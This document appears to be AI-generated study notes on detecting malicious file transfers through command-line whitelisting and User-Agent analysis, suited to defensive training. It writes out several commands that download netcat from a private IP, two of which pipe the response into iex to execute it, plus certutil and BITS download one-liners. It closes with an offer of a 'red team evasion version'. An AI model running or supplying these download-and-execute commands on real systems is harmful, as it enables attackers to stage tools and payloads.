# 🔎 Detection of Malicious File Transfers – Detailed Notes

---

## 🎯 Why Detection Matters

File transfers are a core part of attacker operations:

- Tool staging
    
- Payload delivery
    
- Data exfiltration
    
- Lateral movement
    

Even when attackers use **Living off the Land binaries (LOLBins)**, their activity still leaves artifacts — especially:

- Command-line arguments
    
- HTTP headers
    
- User-Agent strings
    
- Network metadata
    

---

# 🛡 1️⃣ Command-Line Detection

### ❌ Blacklisting (Weak)

- Detects known bad commands (e.g., `certutil -urlcache`)
    
- Easy to bypass:
    
    - Case obfuscation (`CertUtil`, `CeRtUtIl`)
        
    - Encoded PowerShell
        
    - Renamed binaries
        
    - Alternate parameters
        

---

### ✅ Whitelisting (Strong)

> Whitelist all allowed command lines → alert on anything unusual.

✔ More time-consuming initially  
✔ Extremely robust  
✔ Detects anomalies quickly

Example:

Instead of:

```
Block certutil.exe
```

Use:

```
Allow certutil.exe only when used by Windows Update service
Alert on any other usage
```

---

# 🌐 2️⃣ HTTP Protocol & User-Agent Detection

Most malicious file transfers use:

- HTTP
    
- HTTPS
    

Because:

- Almost always allowed through firewalls
    
- Blends with normal web traffic
    

---

## 🔎 What is a User-Agent?

Every HTTP client sends a **User-Agent string**:

```
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US)
```

It identifies:

- Browser (Chrome, Firefox)
    
- PowerShell
    
- cURL
    
- Python
    
- sqlmap
    
- Nmap
    
- Windows Update
    
- AV Updaters
    

---

## 🧠 Detection Strategy

Organizations should:

1. Build list of legitimate user agents
    
    - Browsers
        
    - Windows Update
        
    - Antivirus
        
    - Corporate software
        
2. Feed into SIEM
    
3. Filter legitimate traffic
    
4. Investigate anomalies
    

This is **far more effective than simple blocking**.

---

# 🧪 Common File Transfer User-Agent Signatures

The following were observed on:

- Windows 10 (10.0.14393)
    
- PowerShell 5
    

---

# 📌 Invoke-WebRequest

### Client

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

### Server View

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### 🔍 Detection Clue:

`WindowsPowerShell/5.1.x`

---

# 📌 WinHttpRequest

### Client

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```

### Server View

```
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### 🔍 Detection Clue:

`WinHttp.WinHttpRequest.5`

---

# 📌 Msxml2.XMLHTTP

### Client

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```

### Server View

```
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### 🔍 Detection Clue:

Legacy IE-style UA on modern OS

---

# 📌 Certutil

### Client

```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe
```

### Server View

```
User-Agent: Microsoft-CryptoAPI/10.0
```

### 🔍 Detection Clue:

`Microsoft-CryptoAPI`

⚠ Very common attacker technique

---

# 📌 BITS

### Client

```powershell
Import-Module bitstransfer
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t
```

### Server View

```
HEAD /nc.exe HTTP/1.1
User-Agent: Microsoft BITS/7.8
```

### 🔍 Detection Clue:

`Microsoft BITS`

---

# 🖼 Detection Architecture Overview

![Image](https://www.logsign.com/uploads/12_1_1024x504_3186269c95.png)

![Image](https://www.researchgate.net/publication/353850592/figure/fig1/AS%3A11431281089632080%401665627195645/Network-intrusion-detection-system-with-network-traffic-analysis-26.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AGYiEp5wbLbgonaqynB44ZQ.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A2000/1%2AQRYdhitjgBg1ixPPnPjy5w.png)

### Typical Detection Pipeline:

1. Firewall logs HTTP requests
    
2. IDS/IPS inspects traffic
    
3. Logs forwarded to SIEM
    
4. User-Agent filtered against whitelist
    
5. Anomalies trigger alerts
    
6. SOC investigates
    

---

# 📊 Comparison Table – Suspicious User Agents

|Tool|Server User-Agent|Detection Indicator|
|---|---|---|
|Invoke-WebRequest|WindowsPowerShell/5.x|PowerShell web activity|
|WinHttpRequest|WinHttp.WinHttpRequest|COM-based download|
|Msxml2.XMLHTTP|MSIE 7.0 / Trident|Script-based download|
|Certutil|Microsoft-CryptoAPI|LOLBin abuse|
|BITS|Microsoft BITS/x|Background transfer abuse|

---

# 🛡 Best Defensive Practices

### 1️⃣ Create Command-Line Whitelist

- Allow only expected parameters
    
- Alert on anomalies
    

---

### 2️⃣ Monitor User-Agent Strings

- Build baseline
    
- Detect uncommon agents
    
- Detect rare agents from endpoints
    

---

### 3️⃣ Hunt for:

- `nc.exe` downloads
    
- `.ps1` over HTTP
    
- Executables over plaintext HTTP
    
- Certutil usage
    
- BITS jobs from user accounts
    

---

### 4️⃣ Monitor HTTP Methods

BITS often performs:

```
HEAD requests before GET
```

Certreq often sends:

```
POST requests
```

Unusual methods can indicate malicious activity.

---

# ⚠ Important (Keep As-Is)

✔ Blacklisting is easy to bypass  
✔ Whitelisting is robust but time-consuming  
✔ Hunting for anomalous user agent strings can be an excellent way to catch an attack in progress  
✔ This section just scratches the surface on detecting malicious file transfers

---

# 🧠 Key Takeaways

- Most attackers use HTTP/HTTPS
    
- User-Agent strings are powerful detection artifacts
    
- LOLBins still leave network traces
    
- Behavior-based detection > signature-based blocking
    
- Build environment baseline first
    

---

If you'd like next:

- 📝 One-page detection cheat sheet
    
- 📊 Exam-focused ultra-compact sheet
    
- 🔥 Red team evasion version
    
- 🛡 Blue team hunting playbook
    
- 🧠 Interview prep sheet
    

Just tell me which format you want.